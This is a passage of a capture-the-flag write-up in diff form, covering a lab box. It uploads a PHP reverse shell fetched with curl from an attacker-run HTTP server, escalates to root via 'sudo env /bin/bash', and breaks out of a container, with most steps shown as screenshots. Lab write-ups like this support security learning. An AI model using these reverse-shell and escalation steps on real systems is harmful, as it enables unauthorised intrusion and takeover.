@@ -122,5 +122,77 @@ It's moment to upload to Remote Code Execution
 
 I need upload my php reverse shell.
 
+To upload i do the next steps
+
+**1.** Configure the PHP File
+
+![image](https://user-images.githubusercontent.com/79543461/176541693-679fb2c9-3ad0-4053-9cc3-dbb07a6d087b.png)
+
+**2.** Active Python HTTP Server
+
+![image](https://user-images.githubusercontent.com/79543461/176541858-9557c6d3-674d-4a00-b34b-0fc13d41d341.png)
+
+**3.** Download and Save shell with victim machine
+
+curl -o shell.php 10.8.222.251:8000/shell.php
+
+**4.** Activate your Listener 
+
+![image](https://user-images.githubusercontent.com/79543461/176542198-31dcaf95-6d56-4e5d-8b51-cdbf1b67a526.png)
+
+**5.** Open with browser Shell file
+
+http://10.10.223.232/shell.php
+
+And you have shell working
+
+**PrivEsc**
+
+sudo -l
+
+**ENV ROOT SHELL**
+
+I see this user can execute env command with sudo permisions
+
+**GTFOBINS**
+
+![image](https://user-images.githubusercontent.com/79543461/176544171-8efbd861-0814-44ad-9424-3b59f630f5b8.png)
+
+sudo /usr/bin/env /bin/bash
+
+**Root Shell**
+
+![image](https://user-images.githubusercontent.com/79543461/176544345-e977a6c5-008f-410c-8fea-64225dfd861a.png)
 
 
+**Flag 2 and 3**
+
+![image](https://user-images.githubusercontent.com/79543461/176544642-ae2ae665-b29a-459d-8fed-d05b50dfd48d.png)
+
+**/opt/backups**
+
+I found this!!
+
+![image](https://user-images.githubusercontent.com/79543461/176545146-16e666f2-ef11-4649-8aed-9608128cc450.png)
+
+![image](https://user-images.githubusercontent.com/79543461/176545248-e5d9e4ee-d230-4cd0-9346-b91efd55be2d.png)
+
+tar -xvf backup.tar
+
+**BreakOut Container**
+
+![image](https://user-images.githubusercontent.com/79543461/176548118-ced6fca2-69aa-4d33-856f-5514f1e829b8.png)
+
+![image](https://user-images.githubusercontent.com/79543461/176548234-66df1fae-1520-405d-9066-e84f64087b89.png)
+
+![image](https://user-images.githubusercontent.com/79543461/176548699-b5244b9b-9384-4875-b841-e0b425f7cc58.png)
+
+And Wait...
+
+![image](https://user-images.githubusercontent.com/79543461/176549524-b1b13519-2a68-40f6-83f2-3da54cd6e954.png)
+
+**Root Flag**
+
+![image](https://user-images.githubusercontent.com/79543461/176549617-962ea253-3cbc-4275-8d95-03a063dadbd3.png)
+
+Thanks!
